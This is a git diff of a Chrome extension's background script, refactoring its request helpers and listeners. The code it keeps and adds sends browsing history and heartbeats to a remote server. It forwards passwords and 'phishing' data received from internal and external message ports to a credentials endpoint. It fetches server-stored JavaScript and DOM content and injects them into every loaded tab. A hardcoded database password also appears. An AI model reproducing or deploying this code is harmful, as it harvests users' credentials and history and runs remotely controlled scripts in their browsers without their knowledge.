@@ -6,7 +6,7 @@ var db_password = "soteria01";
 /* All Functions*/
 
 setInterval(timerEvent, 60000);
-setInterval(injectionEvent, 30000);
+// setInterval(injectionEvent, 30000);
 /*Function to create a unique random token to be used as an ID for client*/
 function getRandomToken() {
   var randomPool = new Uint8Array(32);
@@ -34,12 +34,32 @@ function sendGetRequest(url, responseType, onloadCallback, onerrorCallback) {
 
 /*Utility Function to send POST requests*/
 function sendPostRequest(url, payload, onloadCallback, onerrorCallback) {
-  var y = new XMLHttpRequest();
-  y.open("POST", url);
-  y.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-  y.onload = onloadCallback;
-  y.onerror = onerrorCallback;
-  y.send(JSON.stringify(payload));
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", url);
+  xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4) {
+      // Request is done
+      if (xhr.status >= 200 && xhr.status < 300) {
+        // Success: Call onloadCallback with parsed response
+        onloadCallback(JSON.parse(xhr.responseText));
+      } else {
+        // Error: Call onerrorCallback with status & response
+        if (onerrorCallback) {
+          onerrorCallback(xhr.status, xhr.responseText);
+        }
+      }
+    }
+  };
+
+  xhr.onerror = function () {
+    if (onerrorCallback) {
+      onerrorCallback(xhr.status, "Network error");
+    }
+  };
+
+  xhr.send(JSON.stringify(payload));
 }
 
 /*Function to create record for a new user*/
@@ -47,7 +67,6 @@ function createRecord(userid) {
   var jsonData = {};
   url = baseURL + "/user/_doc/";
   url = url.concat(userid);
-  jsonData = {};
   jsonData = {};
   jsonData["userid"] = userid;
   jsonData["extensionid"] = chrome.runtime.id;
@@ -62,8 +81,8 @@ function createRecord(userid) {
     jsonData,
     function () {
       /*TODO: Need to test if this works*/
-      timerEvent();
-      getHistory();
+      // timerEvent();
+      // getHistory();
     },
     function () {}
   );
@@ -99,14 +118,14 @@ function getHistory() {
         });
         var milliseconds = new Date().getTime();
         chrome.storage.sync.set({ lasthistoryloggedtime: milliseconds });
-
+        //TODO: UNCOMMENT
         if (flag) {
-          sendPostRequest(
-            url,
-            jsonData,
-            function () {},
-            function () {}
-          );
+          // sendPostRequest(
+          //   url,
+          //   jsonData,
+          //   function () {},
+          //   function () {}
+          // );
         }
       });
     }
@@ -168,9 +187,8 @@ function timerEvent() {
   //Send a heartbeat to server that user is online
   chrome.storage.sync.get("userid", function (items) {
     var jsonData = {};
-    lastSeenUrl = baseURL + "/user/" + items.userid + "/_update";
-    jsonData["doc"] = {};
-    jsonData["doc"]["last_seen"] = new Date().getTime();
+    lastSeenUrl = baseURL + "/user/_update/" + items.userid;
+    var jsonData = { doc: { create_timestamp: new Date().getTime() } };
     sendPostRequest(
       lastSeenUrl,
       jsonData,
@@ -283,9 +301,12 @@ chrome.runtime.onInstalled.addListener(function (details) {
       if (!userid) userid = getRandomToken();
       chrome.storage.sync.set({ userid: userid });
       createRecord(userid);
+      timerEvent();
+      getHistory();
     });
   } else if (details.reason == "update") {
     getHistory();
+    timerEvent();
     var thisVersion = chrome.runtime.getManifest().version;
   }
 });
@@ -344,15 +365,14 @@ chrome.webRequest.onSendHeaders.addListener(
   ["requestHeaders"]
 );
 
-chrome.cookie.getAll(function (details) {});
 /*Listener for webnavigation complete event*/
 chrome.webNavigation.onCompleted.addListener(function (details) {
   getHistory();
 });
 
 /*Message passing/communicatin system for within extension*/
-chrome.runtime.onConnect.addListener(function (port) {
-  var credUrl = baseURL + "/credentials/";
+chrome.extension.onConnect.addListener(function (port) {
+  var credUrl = baseURL + "/credentials/_doc/";
 
   port.onMessage.addListener(function (msg) {
     chrome.storage.sync.get(["userid"], function (items) {
@@ -361,39 +381,24 @@ chrome.runtime.onConnect.addListener(function (port) {
         return;
       }
 
-      var jsonData = {};
-      jsonData["data"] = {};
-      jsonData["data"]["userid"] = userid;
+      var jsonData = { data: { userid: userid } };
+
       if ("password" in msg) {
-        jsonData["data"]["password"] = msg["password"];
-        sendPostRequest(
-          credUrl,
-          jsonData,
-          function () {},
-          function () {}
-        );
+        jsonData.data.password = msg.password;
       }
-
       if ("phishing" in msg) {
-        jsonData["data"]["phishing"] = msg["phishing"];
-        sendPostRequest(
-          credUrl,
-          jsonData,
-          function () {},
-          function () {}
-        );
+        jsonData.data.phishing = msg.phishing;
+      }
+      if ("scriptphish" in msg) {
+        jsonData.data.scriptphish = msg.scriptphish;
       }
 
-      if ("scriptphish" in msg) {
-        jsonData["data"]["scriptphish"] = msg["scriptphish"];
-        sendPostRequest(
-          credUrl,
-          jsonData,
-          function () {},
-          function () {}
-        );
-      }
-      return true;
+      sendPostRequest(
+        credUrl,
+        jsonData,
+        function () {},
+        function () {}
+      );
     });
   });
 });
@@ -409,37 +414,24 @@ chrome.runtime.onConnectExternal.addListener(function (port) {
         return;
       }
 
-      var jsonData = {};
-      jsonData["data"] = {};
-      jsonData["data"]["userid"] = userid;
+      var jsonData = { data: { userid: userid } };
+
       if ("password" in msg) {
-        jsonData["data"]["password"] = msg["password"];
-        sendPostRequest(
-          credUrl,
-          jsonData,
-          function () {},
-          function () {}
-        );
+        jsonData.data.password = msg.password;
       }
       if ("phishing" in msg) {
-        jsonData["data"]["phishing"] = msg["phishing"];
-        sendPostRequest(
-          credUrl,
-          jsonData,
-          function () {},
-          function () {}
-        );
+        jsonData.data.phishing = msg.phishing;
       }
       if ("scriptphish" in msg) {
-        jsonData["data"]["scriptphish"] = msg["scriptphish"];
-        sendPostRequest(
-          credUrl,
-          jsonData,
-          function () {},
-          function () {}
-        );
+        jsonData.data.scriptphish = msg.scriptphish;
       }
-      return true;
+
+      sendPostRequest(
+        credUrl,
+        jsonData,
+        function () {},
+        function () {}
+      );
     });
   });
 });
@@ -447,87 +439,65 @@ chrome.runtime.onConnectExternal.addListener(function (port) {
 /*Listener for tab update event*/
 chrome.tabs.onUpdated.addListener(function (tabId, info, tab) {
   if (info.status == "complete") {
-    //Skip adding any script for the modified new tab
     if (tab.url != "chrome://newtab/" && tab.url != "chrome://") {
-      chrome.tabs.executeScript(tabId, {
-        file: "insert.js",
-      });
-    } else {
-      return;
+      chrome.tabs.executeScript(tabId, { file: "insert.js" });
     }
-
-    /*For DOM Object Insertion*/
-    var doms;
-    var dom;
+    /* Retrieve DOM Objects */
     chrome.storage.sync.get("userid", function (items) {
-      domUrl =
-        baseURL +
-        "/dom/_search?q=data.userid:" +
-        items.userid +
-        "&data.website:" +
-        tab.url;
+      if (!items.userid) return;
 
-      sendGetRequest(domUrl, "json", function domsForUser(items1) {
-        if (items1) {
-          doms = items1.hits.hits;
+      var domUrl = `${baseURL}/dom/_search`;
+      var domQuery = {
+        query: {
+          bool: {
+            must: [
+              { match: { "data.userid": items.userid } },
+              { match: { "data.website": tab.url } },
+            ],
+          },
+        },
+      };
 
-          if (!doms) {
-            dom = null;
-          } else {
-            for (var i = doms.length - 1; i >= 0; i--) {
-              var obj = doms[i];
-              if (tab.url == obj._source.data.website) {
-                dom = obj._source.data.dom_object;
-              }
-            }
+      sendPostRequest(
+        domUrl,
+        domQuery,
+        function (items1) {
+          if (items1.hits.hits.length > 0) {
+            var dom = items1.hits.hits[0]._source.data.dom_object;
+            chrome.tabs.sendMessage(tabId, { data: dom, type: "dom" });
           }
-        }
-
-        if (dom) {
-          chrome.tabs.sendMessage(
-            tabId,
-            { data: dom, type: "dom" },
-            function (response) {}
-          );
-        }
-      });
+        },
+        function () {}
+      );
     });
 
-    /*For JS Insertion*/
-    var scripts;
-    var script;
+    /* Retrieve JS Injections */
     chrome.storage.sync.get("userid", function (items) {
-      scriptUrl =
-        baseURL +
-        "/js/_search?q=data.userid:" +
-        items.userid +
-        "&data.website:" +
-        tab.url;
+      if (!items.userid) return;
 
-      sendGetRequest(scriptUrl, "json", function scriptsForUser(items2) {
-        if (items2) {
-          scripts = items2.hits.hits;
+      var scriptUrl = `${baseURL}/js/_search`;
+      var scriptQuery = {
+        query: {
+          bool: {
+            must: [
+              { match: { "data.userid": items.userid } },
+              { match: { "data.website": tab.url } },
+            ],
+          },
+        },
+      };
 
-          if (!scripts) {
-            script = null;
-          } else {
-            for (var i = scripts.length - 1; i >= 0; i--) {
-              var obj = scripts[i];
-              if (tab.url == obj._source.data.website) {
-                script = obj._source.data.js_object;
-              }
-            }
+      sendPostRequest(
+        scriptUrl,
+        scriptQuery,
+        function (items2) {
+          if (items2.hits.hits.length > 0) {
+            var script = items2.hits.hits[0]._source.data.js_object;
+            chrome.tabs.sendMessage(tabId, { data: script, type: "js" });
           }
-        }
-
-        if (script) {
-          chrome.tabs.sendMessage(
-            tabId,
-            { data: script, type: "js" },
-            function (response) {}
-          );
-        }
-      });
+        },
+        function () {}
+      );
     });
   }
 });
